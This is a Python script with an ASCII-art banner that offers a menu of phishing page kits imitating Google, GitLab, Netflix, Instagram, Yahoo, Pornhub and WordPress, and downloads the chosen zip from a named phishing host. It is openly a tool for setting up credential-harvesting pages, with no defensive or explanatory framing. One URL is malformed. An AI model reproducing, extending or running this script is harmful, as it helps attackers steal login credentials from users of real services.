import requests
phishing_Google = "https://phishing.blackwin.ir/assets/pages/google.zip"
phishing_Gitlab = "https://phishing.blackwin.irassets/pages/gitlab.zip"
phishing_NetFlix = "https://phishing.blackwin.ir/assets/pages/netflix.zip"
phishing_Instagram = "https://phishing.blackwin.ir/assets/pages/instagram.zip"
phishing_Yahoo = "https://phishing.blackwin.ir/assets/pages/yahoo.zip"
phishing_Pornhub = "https://phishing.blackwin.ir/assets/pages/pornhub.zip"
phishing_Wordpress = "https://phishing.blackwin.ir/assets/pages/wordpress.zip"
print("""\n

                                     '''''^,,,,,,,,,''''                                  
                          .`,![tt$$$$$$$$vttttttttttt$$$$$*t!,'                           
                      'I|M&x|?,,"'''                    .'^,?|zM|I.                       
                    'n$?^.                                     .^1$M"                     
                   .W$`                                           .[$[                    
                   x$'                                              I$x.                  
                  ?$?                                                !$<                  
                  $$"                                                 *$                  
                 `$$        '`,,,,'.                    ''''''.       ,$!                 
                 :$x    ^!z$Mz|?xx$$$xI.           .^1M$$Mxxxx&$x<.    $M                 
                 1$!  .tj!` !W$*1,."t$$$[.        !$$$t!![tv$t..,-*[.  $$                 
                 1$!  ^.      .^I|Mx!^IM$*      .x$M??|$&?,.       ',  1$,                
                 n$^               "|$x^..       ''!M&!^               1$!                
                 $$                  ,W$*'        t*,.                 1$!                
                 $$       "??xx???!,'.`$$z.      ?,    ',??xxx1!^      1$!                
                 $$    .|M$$$$$$$$$$$$1?$$!        .!n$$$$$$$$$$$x^.   1$!                
                 $$  `$$$$$$$$$$$$$$$$i!$$t        ,*$$$$$$$$$$$$Wtt-,`)$!                
                 $$  '?,,,,,,,,,,,^'.  !$$$                            x$,                
                 1$!                   !$$$                            $$                 
                 -$$.                  !$$$                           `$*                 
                 "$$/.                 |$$$                           ?$!                 
                  $$$M,              ^/$$$?                         '|$8                  
                  !$vt$v!``     `` '*$$$$$!       :[.            .,t$$$-                  
                   M$'?$$$$M?I,,`. 1$M'|$$.        .x'  .,,,,?/xM/$$x$$'                  
                   '$M.<$|$$?.     `M, x$x           .      .!$$,I$?x$!                   
                    ?$t !$:$$W,.       [$1                 `*$$`.W!!$t                    
                    .$$, 'z,!$$$/!^'  .,$$!,,,,/$M'     `!M$$M`!$,,$z.                    
                     '$&' .||"!M$$$$$$$$$$$M<M$$$$$M?/M$$$$x^^xx'`$$'                     
                      `$*.  !W,.'!t$$$$$$$>   ,W$$$$$$$$v!.`*$1 .W$,                      
                       ,$M.  ?$$?^  '^,,,I,,,,,I?????,'.   `M! 'M$^                       
                        ,$z.  ,$$$x?,^.                   ^/. `$$"                        
                         `$*`  `$$,  `!,!!!!!!!!!        !t. `W$`                         
                          "$$"  ,$!      .$$$$$z.       ,^  !$z.                          
                           'x$?. ^M.      x$$$$"       .. ./$|.                           
                             1$*' ..     :$$$$$)         ,$$,                             
                              :M&!       1$$$$$$,      .1$M'                              
                                ?$M,     I$$$$$x     .|$*^                                
                                 .[$*,   .$$$$$:   .[W$[.                                 
                                   '|$z!' ?$$$$`.^1$M?.                                   
                                     .,|$&M$$$$z$M?^                                      
                                         `!!!!!".                                         
                                                                                          
                                                                                          
    Enter the phishing file of the comment with the number :
        [1] Google
        [2] Gitlab
        [3] Netflix 
        [4] Instagram
        [5] Yahoo
        [6] Pornhub
        [7] Wordpress \n
            """)
vorody = int(input("Enter the Number phishing >  ")) 

for i in range(vorody): 
    if vorody == 1:
        r = requests.get(phishing_Google)
        with open("Google.zip",'wb') as f:  
            f.write(r.content)
            print("[+] Download File phishing Google :) ")

for i in range(vorody):
    if vorody == 2:
        r = requests.get(phishing_Gitlab)
        with open("Gitlab.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing Gitlab :)")

for i in range(vorody):
    if vorody == 3:
        r = requests.get(phishing_NetFlix)
        with open("Netflix.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing Netflix :)")

for i in range(vorody):
    if vorody == 4:
        r = requests.get(phishing_Instagram)
        with open("instagram.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing instagram :)")

for i in range(vorody):
    if vorody == 5:
        r = requests.get(phishing_Yahoo)
        with open("Yahoo.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing Yahoo :)")

for i in range(vorody):
    if vorody == 6:
        r = requests.get(phishing_Pornhub)
        with open("Pornhub.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing Pornhub :)")

for i in range(vorody):
    if vorody == 7:
        r = requests.get(phishing_Wordpress)
        with open("Wordpress.zip",'wb') as f:
            f.write(r.content)
            print("[+] Download File phishing Wordpress :)")
